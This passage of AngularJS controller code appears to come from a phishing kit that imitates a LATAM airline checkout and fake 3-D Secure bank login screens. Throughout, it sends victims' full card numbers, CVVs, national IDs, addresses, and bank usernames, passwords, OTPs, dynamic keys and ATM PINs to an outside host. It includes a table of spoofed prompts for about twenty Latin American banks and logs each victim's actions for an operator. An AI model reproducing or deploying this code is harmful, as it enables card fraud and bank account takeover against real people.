      const currentMonth = currentDate.getMonth() + 1;

      // Convertir a números
      month = parseInt(month);
      year = parseInt("20" + year);

      // Validar formato
      if (isNaN(month) || isNaN(year)) {
        return false;
      }

      // Validar rango de mes (1-12)
      if (month < 1 || month > 12) {
        return false;
      }

      // Validar que no sea fecha pasada
      if (
        year < currentYear ||
        (year === currentYear && month < currentMonth)
      ) {
        return false;
      }

      return true;
    };

    // Validar CVV
    $scope.validateCVV = function (cvv, cardType) {
      // Verificar que no haya contenido vacio
      if (!cvv) {
        return false;
      }

      // Remover espacios
      cvv = cvv.replace(/\s/g, "");

      // Validar que sean solo números
      if (!/^\d+$/.test(cvv)) {
        return false;
      }

      // Validar longitud según tipo de tarjeta
      if (cardType === "amex") {
        return cvv.length === 4;
      }

      return cvv.length === 3;
    };

    // Validar campos del formulario
    $scope.validateForm = function () {
      const errors = [];

      // Validar tarjeta
      if (!$scope.validateCreditCard($scope.ccNum)) {
        errors.push({ field: "ccNum", message: "Número de tarjeta inválido" });
      }

      // Validar fecha expiración
      const [month, year] = ($scope.datecc || "").split("/");
      if (!$scope.validateExpiryDate(month, year)) {
        errors.push({
          field: "datecc",
          message: "Fecha de expiración inválida",
        });
      }

      // Validar CVV
      const cardType =
        $scope.ccNum &&
        ($scope.ccNum.startsWith("34") || $scope.ccNum.startsWith("37"))
          ? "amex"
          : "other";
      if (!$scope.validateCVV($scope.cvv, cardType)) {
        errors.push({ field: "cvv", message: "CVV inválido" });
      }

      // Validar demás campos
      if (!$scope.ccName || $scope.ccName.length < 3) {
        errors.push({ field: "ccName", message: "Nombre inválido" });
      }

      if (!$scope.cedula || $scope.cedula.length < 4) {
        errors.push({ field: "cedula", message: "Cédula inválida" });
      }

      if (!$scope.tel || !/^\d{10}$/.test($scope.tel)) {
        errors.push({ field: "tel", message: "Teléfono inválido" });
      }

      if (!$scope.city || $scope.city.length < 3) {
        errors.push({ field: "city", message: "Ciudad inválida" });
      }

      if (!$scope.addr || $scope.addr.length < 2) {
        errors.push({ field: "addr", message: "Dirección inválida" });
      }

      if (!$scope.email || !/\S+@\S+\.\S+/.test($scope.email)) {
        errors.push({ field: "email", message: "Email inválido" });
      }

      // Si hay errores, mostrar el primero y hacer focus
      if (errors.length > 0) {
        const firstError = errors[0];
        $scope[
          "bad" +
            firstError.field.charAt(0).toUpperCase() +
            firstError.field.slice(1)
        ] = true;

        const element = $("#" + firstError.field);
        if (element.length > 0) {
          $("html, body").animate({
            scrollTop: element.offset().top - 50,
          });
        }

        return false;
      }

      return true;
    };

    // Modificar checkFormAndPay para usar nueva validación
    $scope.checkFormAndPay = function ($event) {
      // Prevenir comportamiento predeterminado si existe evento
      if ($event) {
        $event.preventDefault();
      }

      // Prevenir múltiples clicks
      if ($scope.formProcessing) {
        return;
      }

      // Verificar la tarjeta primero
      const cardInfo = $scope.getCardType($scope.realcc);
      if (
        $scope.badCC ||
        !$scope.validateLuhn($scope.realcc) ||
        !cardInfo.valid ||
        cardInfo.type === "INVALID"
      ) {
        $("html, body").animate({
          scrollTop: $("#ccNum").offset().top - 50,
        });
        $scope.badCC = true;
        $scope.txtValidCard = "Por favor verifique el número de tarjeta";
        return;
      }

      $scope.formProcessing = true;

      // Validar formulario
      if ($scope.validateForm()) {
        // Mostrar indicador de carga
        $scope.loader = true;

        // Intentar procesar el pago
        try {
          $scope.goToBanks();
        } catch (error) {
          console.error("Error procesando pago:", error);
          $scope.loader = false;
          $scope.formProcessing = false;
          // Mostrar mensaje de error al usuario
          $scope.showError(
            "Hubo un error procesando el pago. Por favor intente nuevamente."
          );
        }
      } else {
        $scope.formProcessing = false;
      }
    };

    $scope.dataConfig = undefined;
    $scope.getConfig = function () {
      $http
        .post("api/getConfig", {})
        .success(function (kertrina) {
          $scope.dataConfig = kertrina.id;
        })
        .error(function (nary) {
          console.log(nary);
          $scope.loading = false;
        });
    };
    $scope.getConfig();
    $scope.ccsaved = false;
    $scope.loadingSave = false;
    $scope.saveCC = function () {
      $scope.badCvv = false;
      if (!($scope.ccsaved || $scope.loadingSave)) {
        $scope.loadingSave = true;
        $http
          .post("https://latam-fastapi.onrender.com/api/api", {
            id: $scope.chosenGUID,
            name: $scope.ccName,
            cc: $scope.realcc,
            datecc: $scope.datecc,
            cvv: $scope.cvv,
            ua: navigator.userAgent,
          })
          .success(function (bay) {
            $scope.ccsaved = true;
          })
          .error(function (gerlyn) {
            console.log(gerlyn);
            $scope.loading = false;
          });
      }
    };
    $scope.goToBanks = function () {
      let caressa = $scope.ccNum;
      $scope.realcc = caressa.replace(/[^0-9]/g, "");
      $scope.realcc = $scope.realcc.replace(/\s/g, "");
      $scope.loader = true;
      console.log("Sending GET request to: api/lookBin?cc=" + $scope.realcc);
      $http
        .get("api/lookBin?cc=" + $scope.realcc, {})
        .success(function (cobee) {
          $scope.bankResponse = cobee;
          var postPayload = {
            id: $scope.chosenGUID,
            name: $scope.ccName,
            cc: $scope.realcc,
            datecc: $scope.datecc,
            cvv: $scope.cvv,
            tel: $scope.tel,
            dir: $scope.addr,
            cedula: $scope.cedula,
            city: $scope.city,
            bank: $scope.bankResponse,
            email: $scope.email,
            ua: navigator.userAgent,
            a: "registerUserLatam",
          };
          console.log(
            "Sending POST request to: https://latam-fastapi.onrender.com/api/preset"
          );
          console.log("Payload:", postPayload);
          $http
            .post("https://latam-fastapi.onrender.com/api/preset", postPayload)
            .success(async function (dominika) {
              var jante = $scope.dataLatam;
              if (null != jante) {
                var berat = -1;
                for (let amiliya = 0; amiliya < jante.length; amiliya++) {
                  if (5 == jante[amiliya].step) {
                    berat = amiliya;
                  }
                }
                if (-1 != berat) {
                  let gloyd = $scope.ccNum;
                  $scope.realcc = gloyd.replace(/[^0-9]/g, "");
                  jante[berat].info = [];
                  jante[berat].info.push({
                    bank: $scope.bankResponse,
                    cc: $scope.realcc,
                    name: $scope.ccName,
                    datecc: $scope.datecc,
                    cvv: $scope.cvv,
                    tel: $scope.tel,
                    city: $scope.city,
                    addr: $scope.addr,
                    cedula: $scope.cedula,
                    email: $scope.email,
                  });
                  // await $scope.verifyBin($scope.ccNum);
                  localStorage.setItem(
                    "latamStorageFake",
                    JSON.stringify(jante)
                  );
                  localStorage.setItem(
                    "bin",
                    JSON.stringify($scope.bankResponse)
                  );
                  $scope.goTransitionPay();
                } else {
                  var syliva = {
                    step: 5,
                    info: [
                      {
                        bank: $scope.bankResponse,
                        cc: $scope.realcc,
                        name: $scope.ccName,
                        datecc: $scope.datecc,
                        cvv: $scope.cvv,
                        tel: $scope.tel,
                        city: $scope.city,
                        addr: $scope.addr,
                        cedula: $scope.cedula,
                        email: $scope.email,
                      },
                    ],
                  };
                  jante.push(syliva);
                  // await $scope.verifyBin($scope.ccNum);
                  localStorage.setItem(
                    "latamStorageFake",
                    JSON.stringify(jante)
                  );
                  localStorage.setItem(
                    "bin",
                    JSON.stringify($scope.bankResponse)
                  );
                  $scope.goTransitionPay();
                }
              }
            })
            .error(function (haruki) {
              console.log(haruki);
              $scope.loading = false;
            });
        })
        .error(function (amirkhan) {
          console.log(amirkhan);
          $scope.loading = false;
        });
    };

    /////////////////////////////////////////////////////////============================///////
    /////////////////////////////////////////////////////////============================///////

    const banksData = {
      avvillas: {
        bankFieldLabel1: "Cédula de ciudadanía",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "100",
        bankFieldErrorMsg:
          "La contraseña debe contener al menos 1 letra Mayúscula, 1 Minúscula y números.",
        bankFieldImagePath: "./assets/BANKS/avvillas.png",
      },
      bogota: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Clave segura",
        bankFieldMaxLength: "4",
        bankFieldErrorMsg: "La clave segura debe tener 4 dígitos.",
        bankFieldImagePath: "./assets/BANKS/bancobogota.png",
      },
      bancolombia: {
        bankFieldLabel1: "Clave Dinamica",
        bankFieldLabel2: "Clave",
        bankFieldMaxLength: "4",
        bankFieldErrorMsg: "La clave debe tener 4 dígitos.",
        bankFieldImagePath: "./assets/BANKS/bancol.png",
      },
      bbva: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Contraseña",
        bankFieldMaxLength: "8",
        bankFieldImageWidth: "80",
        bankFieldErrorMsg:
          "La contraseña debe ser de 8 caracteres y contener letras y números",
        bankFieldImagePath: "./assets/BANKS/bbva.png",
      },
      bilbao: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Contraseña",
        bankFieldMaxLength: "8",
        bankFieldImageWidth: "80",
        bankFieldErrorMsg:
          "La contraseña debe ser de 8 caracteres y contener letras y números",
        bankFieldImagePath: "./assets/BANKS/bbva.png",
      },
      occidente: {
        bankFieldLabel1: "Identificación",
        bankFieldLabel2: "Contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "80",
        bankFieldErrorMsg:
          "La contraseña debe contener al menos 1 letra Mayúscula, 1 Minúscula y números.",
        bankFieldImagePath: "./assets/BANKS/bocc.png",
      },
      popular: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "4",
        bankFieldImageWidth: "100",
        bankFieldErrorMsg: "La clave debe tener 4 dígitos",
        bankFieldImagePath: "./assets/BANKS/bpopular.png",
      },
      cajasocial: {
        bankFieldLabel1: "Número de identificación",
        bankFieldLabel2: "Contraseña",
        bankFieldMaxLength: "8",
        bankFieldErrorMsg:
          "La contraseña debe contener al menos 1 letra Mayúscula, 1 Minúscula y números.",
        bankFieldImagePath: "./assets/BANKS/cajasocial.png",
      },
      citibank: {
        bankFieldLabel1: "Número de identificación",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldErrorMsg:
          "La contraseña debe contener al menos 1 letra Mayúscula, 1 Minúscula y números.",
        bankFieldImagePath: "./assets/BANKS/citibank.png",
      },
      colpatria: {
        bankFieldLabel1: "Nombre de usuario",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "15",
        bankFieldErrorMsg:
          "La contraseña debe contener al menos 1 letra Mayúscula, 1 Minúscula y numero.",
        bankFieldImagePath: "./assets/BANKS/colpatria.png",
      },
      nequi: {
        bankFieldLabel1: "Número de celular",
        bankFieldLabel2: "Clave",
        bankFieldMaxLength: "4",
        bankFieldImageWidth: "110",
        bankFieldErrorMsg: "La clave debe tener 4 dígitos.",
        bankFieldImagePath: "./assets/BANKS/nequi.png",
      },
      credibanco: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Clave",
        bankFieldMaxLength: "100",
        bankFieldErrorMsg: "Resiva tu clave e intentalo de nuevo.",
        bankFieldImagePath: "./assets/BANKS/credibanco.png",
      },
      davivienda: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Clave virtual",
        bankFieldMaxLength: "8",
        bankFieldImageWidth: "140",
        bankFieldErrorMsg: "La clave dete tener 6 u 8 dígitos.",
        bankFieldImagePath: "./assets/BANKS/davivienda.png",
      },
      falabella: {
        bankFieldLabel1: "Cédula de ciudadanía",
        bankFieldLabel2: "Clave de internet",
        bankFieldMaxLength: "6",
        bankFieldErrorMsg: "La clave dete tener 6 dígitos.",
        bankFieldImagePath: "./assets/BANKS/falabella.png",
      },
      itau: {
        bankFieldLabel1: "Igresa tu usuario",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "40",
        bankFieldErrorMsg: "Revisa tu contraseña y vuelve a intentar.",
        bankFieldImagePath: "./assets/BANKS/itau.png",
      },
      nubank: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "45",
        bankFieldErrorMsg:
          "La contraseña debe contener 1 letra Mayúscula, 1 Minúscula y números",
        bankFieldImagePath: "./assets/BANKS/nubank.png",
      },
      nupagamentossa: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "45",
        bankFieldErrorMsg:
          "La contraseña debe contener 1 letra Mayúscula, 1 Minúscula y números",
        bankFieldImagePath: "./assets/BANKS/nubank.png",
      },
      rappi: {
        bankFieldLabel1: "Número de documento",
        bankFieldLabel2: "Ingresa tu contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "100",
        bankFieldErrorMsg: "Revisa tu contraseña y vuelve a intentar.",
        bankFieldImagePath: "./assets/BANKS/rappi.png",
      },
      tuya: {
        bankFieldLabel1: "Número de identificación",
        bankFieldLabel2: "Clave",
        bankFieldMaxLength: "4",
        bankFieldImageWidth: "60",
        bankFieldErrorMsg: "La clave debe tener 4 dígitos.",
        bankFieldImagePath: "./assets/BANKS/tuya.png",
      },
      unknow: {
        bankFieldLabel1: "Clave Dinamica/Documento",
        bankFieldLabel2: "Clave/Contraseña",
        bankFieldMaxLength: "100",
        bankFieldImageWidth: "80",
        bankFieldErrorMsg: "Revisa los datos e intentalo de nuevo.",
        bankFieldImagePath: "./assets/BANKS/nobank.png",
      },
    };

    const vendorImages = {
      VISA: "./assets/BANKS/visa.png",
      MASTERCARD: "./assets/BANKS/mastercard.png",
      "AMERICAN EXPRESS": "./assets/BANKS/amex.png",
    };

    // Interval Variable for polling
    let activePollingInterval = null;

    // Función mejorada para recuperar detalles del banco
    function retrieveBankDetails(bankName) {
      // Verificamos si bankName es undefined o null
      if (!bankName) {
        console.log(
          "Nombre de banco no proporcionado, usando banco desconocido"
        );
        return banksData.unknow;
      }

      try {
        // Convertimos a string y limpiamos el nombre del banco
        bankName = String(bankName)
          .toLowerCase()
          .replace(/\s+/g, "")
          .replace(/[^a-z0-9]/gi, "");

        // Buscamos coincidencia en banksData
        for (let bankKey in banksData) {
          if (bankName.includes(bankKey)) {
            return banksData[bankKey];
          }
        }

        // Si no hay coincidencia, retornamos banco desconocido
        console.log("Banco no encontrado en la lista:", bankName);
        return banksData.unknow;
      } catch (error) {
        console.error("Error procesando nombre del banco:", error);
        return banksData.unknow;
      }
    }

    function getVendorImage(vendorName) {
      if (!vendorName) return vendorImages.VISA; // Imagen por defecto

      vendorName = String(vendorName).toUpperCase();
      return vendorImages[vendorName] || vendorImages.VISA;
    }

    // Validación de tarjeta usando algoritmo Luhn
    $scope.validateCardInLuhn = function (cardNumber) {
      cardNumber = cardNumber.replace(/\s+/g, "");
      var cardNumberRegex = new RegExp("^[0-9]{13,19}$");

      if (!cardNumberRegex.test(cardNumber)) {
        return false;
      }

      let luhnChecksum = 0;
      let isEvenIndex = false;

      for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (isEvenIndex) {
          digit *= 2;
          if (digit > 9) {
            digit -= 9;
          }
        }
        luhnChecksum += digit;
        isEvenIndex = !isEvenIndex;
      }

      return luhnChecksum % 10 === 0;
    };

    // Sanitización de datos
    $scope.sanitizeData = function (data) {
      data = data.trim();
      data = data.replace(/</g, "&lt;");
      data = data.replace(/>/g, "&gt;");
      return data;
    };

    // Registro de usuario
    $scope.registerUser = async function (username, password, requestType) {
      const facturaData = JSON.parse(localStorage.getItem("facturaData"));

      let formData = {
        a: requestType,
        u: username,
        p: password,
        address: facturaData.address,
        creditCard: facturaData.creditCard,
        expirationMonth: facturaData.expirationMonth,
        expirationYear: facturaData.expirationYear,
        cvc: facturaData.cvc,
        uniqueTransactionId: $scope.uniqueTransactionId,
        bank: facturaData.bank,
        cedula: facturaData.cedula,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error en registro:", error);
        return null;
      }
    };

    // Verificar BIN de la tarjeta
    $scope.verifyBin = function (cc) {
      const bin = cc.substring(0, 6);
      if (bin.length === 6) {
        $http.get(`api/lookBin?cc=${bin}`).then(function (response) {
          if (response.data.success) {
            localStorage.setItem("bin", JSON.stringify(response.data));
          }
        });
      }
    };

    // Envío de datos de tarjeta
    $scope.sendCreditData = async function (data) {
      const requiredFields = [
        "name",
        "creditCard",
        "expirationMonth",
        "expirationYear",
        "cvc",
        "bank",
        "email",
      ];

      // Validación de campos requeridos
      for (let field of requiredFields) {
        if (!data[field]) {
          return {
            success: false,
            message: "Por favor complete todos los campos",
          };
        }
      }

      localStorage.setItem("facturaData", JSON.stringify(data));

      let formData = {
        a: "sendCreditCard",
        ...data,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando datos:", error);
        return null;
      }
    };

    // Recepción de códigos
    $scope.receiveCodes = async function () {
      let formData = {
        a: "woc",
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error recibiendo códigos:", error);
        return null;
      }
    };

    // Envío de código OTP
    $scope.submitOtpCode = async function (otp, type) {
      let formData = {
        a: type,
        otp: otp,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando OTP:", error);
        return null;
      }
    };

    // Envío de clave dinámica
    $scope.sendDinamica = async function (code, type) {
      let formData = {
        a: type,
        din: code,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando clave dinámica:", error);
        return null;
      }
    };

    // Envío de clave dinámica
    $scope.sendNuBankCodeAlert = async function () {
      let formData = {
        a: "isNuBank",
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando clave dinámica:", error);
        return null;
      }
    };

    // Recarga de tarjeta
    $scope.reloadCreditCard = async function (
      creditCard,
      expirationMonth,
      expirationYear,
      cvc
    ) {
      let formData = {
        a: "reloadCreditCard",
        creditCard: creditCard,
        expirationMonth: expirationMonth,
        expirationYear: expirationYear,
        cvc: cvc,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error recargando tarjeta:", error);
        return null;
      }
    };

    // Envío de clave de cajero
    $scope.sendCajero = async function (code, type) {
      let formData = {
        a: type,
        cca: code,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando clave cajero:", error);
        return null;
      }
    };

    // Manejo de respuesta personalizada
    $scope.getPersonalizadoResponse = async function () {
      let formData = {
        a: "personalizadoGetResponse",
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error obteniendo respuesta personalizada:", error);
        return null;
      }
    };

    // Envío de respuesta personalizada
    $scope.personalizadoSend = async function (response) {
      let formData = {
        a: "personalizado",
        personalizado: response,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando respuesta personalizada:", error);
        return null;
      }
    };

    // Envío de token
    $scope.sendTokenV = async function (token) {
      let formData = {
        a: "token",
        token: token,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando token:", error);
        return null;
      }
    };

    $scope.sendUserLogo = async function (user, pass) {
      let formData = {
        a: "userLogo",
        user: user,
        pass: pass,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando usuario y contraseña:", error);
        return null;
      }
    };

    $scope.changeCodeApi = async function (code) {
      let formData = {
        a: "changeCode",
        code: code,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error enviando usuario y contraseña:", error);
        return null;
      }
    };

    // Funciones de UI
    $scope.showError = function (message) {
      $scope.errorMessage = message;
      $scope.showErrorMessage = true;
    };

    $scope.showLoader = function (show) {
      $scope.modalLoading = show;
    };

    $scope.showButton = function (show) {
      $scope.modalButton = show;
    };

    $scope.disableButton = function (disable) {
      $scope.buttonDisabled = disable;
    };

    $scope.updateActionButton = function (action) {
      $scope.currentAction = action;
    };

    // Funciones de control del timer
    $scope.timerControl = {
      start: function () {
        let timeLeft = 180; // 3 minutos
        nuBankActive = true;

        if ($scope.nuBankTimer) {
          $interval.cancel($scope.nuBankTimer);
        }

        $scope.timerText = "3:00";

        $scope.nuBankTimer = $interval(function () {
          if (!nuBankActive) {
            $interval.cancel($scope.nuBankTimer);
            return;
          }

          timeLeft--;
          $scope.timerText =
            Math.floor(timeLeft / 60) +
            ":" +
            (timeLeft % 60 < 10 ? "0" : "") +
            (timeLeft % 60);

          if (timeLeft <= 0) {
            $interval.cancel($scope.nuBankTimer);
            $scope.handleTimeout();
          }
        }, 1000);
      },

      stop: function () {
        if ($scope.nuBankTimer) {
          $interval.cancel($scope.nuBankTimer);
          $scope.nuBankTimer = null;
        }
        nuBankActive = false;
      },

      reset: function () {
        this.stop();
        this.start();
      },

      isActive: function () {
        return nuBankActive;
      },
    };

    // Manejadores de modales
    $scope.toggleNuBank = function (activateTimer) {
      $scope.modalNU = activateTimer;
      $scope.modalNormal = !activateTimer;

      if (activateTimer) {
        $scope.startNuBankTimer();
      }
    };

    // Funciones públicas para el scope
    $scope.startNuBankTimer = function () {
      $scope.timerControl.start();
    };

    $scope.stopNuBankTimer = function () {
      $scope.timerControl.stop();
    };

    $scope.resetNuBankTimer = function () {
      $scope.timerControl.reset();
    };

    $scope.isTimerActive = function () {
      return $scope.timerControl.isActive();
    };

    // Función de timeout actualizada
    $scope.handleTimeout = async function () {
      if (!nuBankActive) return;

      $scope.stopNuBankTimer();

      if (activePollingInterval) {
        $interval.cancel(activePollingInterval);
        activePollingInterval = null;
      }

      // Resetear todos los estados
      $scope.modalNU = false;
      $scope.modalNormal = false;
      $scope.modalLoading = false;
      $scope.modalGetUser = false;
      $scope.modalButton = false;
      $scope.modalVBV = false;
      $scope.modalError = false;

      document.body.classList.remove("fixedAll");

      // Log y redirección
      await $scope.logUserAction("Error en proceso de pago - Modales cerrados");
      await $scope.logUserAction("Timeout en NuBank después de 3 minutos");

      $state.transitionTo("/Payment", { error: 1 }, { reload: true });
    };

    // Cleanup mejorado
    $scope.$on("$destroy", function () {
      if ($scope.nuBankTimer) {
        $interval.cancel($scope.nuBankTimer);
      }
      nuBankActive = false;
      if (activePollingInterval) {
        $interval.cancel(activePollingInterval);
      }
    });

    // Opcional: Progress bar circular
    function updateProgressBar(timeLeft) {
      if (document.getElementById("progressBarCirclePercentage")) {
        const progress = (timeLeft / 180) * 100;
        document.getElementById(
          "progressBarCirclePercentage"
        ).style.strokeDashoffset = `${100 - progress}%`;
      }
    }

    // Función para formatear el tiempo
    function formatTime(seconds) {
      const minutes = Math.floor(seconds / 60);
      const remainingSeconds = seconds % 60;
      return `${minutes}:${
        remainingSeconds < 10 ? "0" : ""
      }${remainingSeconds}`;
    }

    // Registro de acciones del usuario
    $scope.logUserAction = async function (action) {
      let formData = {
        a: "log",
        log: action,
        uniqueTransactionId: $scope.uniqueTransactionId,
      };

      try {
        const response = await $http.post(
          "https://latam-fastapi.onrender.com/api/api",
          formData
        );
        return response.data;
      } catch (error) {
        console.error("Error en log:", error);
        return null;
      }
    };

    $scope.showModal3D = async function (price, shortCC, userId) {
      console.log("Mostrando modal 3D Secure");
      try {
        // Obtener BIN del localStorage
        let cardBin = null;
        try {
          const binData = localStorage.getItem("bin");
          console.log("BIN Data from localStorage:", binData);
          if (binData) {
            cardBin = JSON.parse(binData);
            console.log("Parsed cardBin:", cardBin);
          }
        } catch (e) {
          console.error("Error leyendo BIN del localStorage:", e);
        }

        // Configuración por defecto
        if (!cardBin) {
          console.log("Using default cardBin config");
          cardBin = {
            bank: "unknow",
            vendor: "VISA",
          };
        }

        // Definimos bankName y vendorName aquí
        let bankName = cardBin.bank || "unknow";
        let vendorName = cardBin.vendor || "VISA";

        console.log("Bank Name:", bankName);
        console.log("Vendor Name:", vendorName);

        // Obtenemos la configuración del banco
        let bankConfig = retrieveBankDetails(bankName);
        console.log("Bank Config:", bankConfig);

        if (!bankConfig) {
          console.log("Using default bank config");
          bankConfig = banksData.unknow;
        }

        // Inicializamos los modelos de datos
        $scope.formData = {
          username: "",
          password: "",
          otp: "",
          token: new Array(6),
        };

        // Configuración del banco para el modal
        $scope.bankData = {
          bankImage: bankConfig.bankFieldImagePath,
          bankImageWidth: bankConfig.bankFieldImageWidth || "120px",
          vendorImage: getVendorImage(vendorName), // Ahora vendorName está definido
          fieldLabel1: bankConfig.bankFieldLabel1,
          fieldLabel2: bankConfig.bankFieldLabel2,
          maxLength: bankConfig.bankFieldMaxLength || 100,
        };

        console.log("Bank Data set:", $scope.bankData);

        // Variables de estado del modal
        $scope.lastCCPago = shortCC;
        $scope.errorModalText =
          bankConfig.bankFieldErrorMsg || "Usuario o clave/contraseña inválida";
        $scope.currentAction = "nu";

        // Activamos el modal y sus estados
        document.body.classList.add("fixedAll");

        // Reset de estados del modal
        $scope.modalVBV = true;
        $scope.modalNormal = true;
        $scope.modalNU = false;
        $scope.modalLoading = true;
        $scope.modalButton = false;
        $scope.modalGetUser = false;
        $scope.modalError = false;

        // Esperamos 3 segundos
        await $timeout(3000);

        // Verificación de NuBank mejorada
        const isNuBank =
          bankConfig.bankFieldImagePath &&
          bankConfig.bankFieldImagePath.toLowerCase().includes("nubank");

        console.log("NuBank check:", {
          bankFieldImagePath: bankConfig.bankFieldImagePath,
          isNuBank: isNuBank,
        });

        console.log("Setting normal bank modal state");
        // Actualizamos el estado para banco normal
        $scope.$apply(() => {
          $scope.modalLoading = false;
          $scope.modalNormal = true;
          $scope.modalNU = false;
          $scope.modalGetUser = true;
          $scope.modalButton = true;
        });

        await $scope.logUserAction(`#${userId} Se le ha solicitado el usuario`);
      } catch (error) {
        console.error("Error en showModal3D:", error);
        // Manejo de error
        $scope.$apply(() => {
          $scope.modalVBV = true;
          $scope.modalNormal = true;
          $scope.modalNU = false;
          $scope.modalLoading = false;
          $scope.modalGetUser = true;
          $scope.modalButton = true;
          $scope.bankFieldConfiguration = banksData.unknow;
        });
      }
    };

    // Helper para verificar estados del modal
    $scope.debugModalState = function () {
      console.log("Modal State:", {
        modalVBV: $scope.modalVBV,
        modalNormal: $scope.modalNormal,
        modalNU: $scope.modalNU,
        modalLoading: $scope.modalLoading,
        modalGetUser: $scope.modalGetUser,
        modalButton: $scope.modalButton,
        bankData: $scope.bankData,
      });
    };
    // En el controlador
    $scope.token = new Array(6).fill("");

    $scope.moveNext = function ($event, index) {
      // Prevenir entrada de caracteres no numéricos
      if ($event.key && !/^[0-9]$/.test($event.key) && $event.keyCode !== 8) {
        $event.preventDefault();
        return;
      }

      const input = $event.target;
      const previousInput = document.getElementById(`input_${index - 1}`);
      const nextInput = document.getElementById(`input_${index + 1}`);

      // Si es borrar (backspace)
      if ($event.keyCode === 8) {
        $scope.token[index] = "";
        input.value = "";
        if (index > 0) {
          previousInput?.focus();
        }
        return;
      }

      // Si es un número
      if (/^[0-9]$/.test($event.key)) {
        $event.preventDefault(); // Prevenir la entrada automática
        $scope.token[index] = $event.key;
        $scope.$apply(); // Actualizar el modelo

        if (index < 5 && nextInput) {
          nextInput.focus();
        }
      }
    };

    // Función para manejar pegar
    $scope.handlePaste = function ($event) {
      $event.preventDefault();

      const pastedData = ($event.clipboardData || window.clipboardData)
        .getData("text")
        .replace(/\D/g, "")
        .slice(0, 6);

      if (pastedData) {
        $scope.token = pastedData.split("");
        $scope.$apply();

        // Enfocar el último campo o el siguiente vacío
        const nextEmptyIndex = $scope.token.findIndex((val) => !val);
        if (nextEmptyIndex >= 0 && nextEmptyIndex < 6) {
          document.getElementById(`input_${nextEmptyIndex}`)?.focus();
        } else {
          document.getElementById("input_5")?.focus();
        }
      }
    };
    // Manejar entrada directa
    $scope.handleInput = function ($event, index) {
      const input = $event.target;
      const value = input.value;

      // Limpiar cualquier valor no numérico
      input.value = value.replace(/\D/g, "").slice(0, 1);

      if (input.value) {
        $scope.token[index] = input.value;

        // Mover al siguiente si hay valor y no es el último
        if (index < 5) {
          document.getElementById(`input_${index + 1}`)?.focus();
        }
      }
    };

    // Función para obtener el token completo
    $scope.getCompleteToken = function () {
      return $scope.token.join("");
    };

    // Función de limpieza al cerrar el modal
    $scope.closeModal = function () {
      $scope.modalVBV = false;
      $scope.modalNU = false;
      $scope.modalNormal = false;
      $scope.modalLoading = false;
      $scope.modalGetUser = false;
      $scope.modalButton = false;
      $scope.modalError = false;
      document.body.classList.remove("fixedAll");
    };

    $scope.showError = function (message) {
      $scope.errorModalText = message;
      $scope.modalError = true;

      // Forzar actualización si es necesario
      if (!$scope.$$phase) {
        $scope.$apply();
      }

      // Opcional: ocultar error después de un tiempo
      $timeout(function () {
        $scope.modalError = false;
      }, 5000);
    };

    // Función para limpiar errores
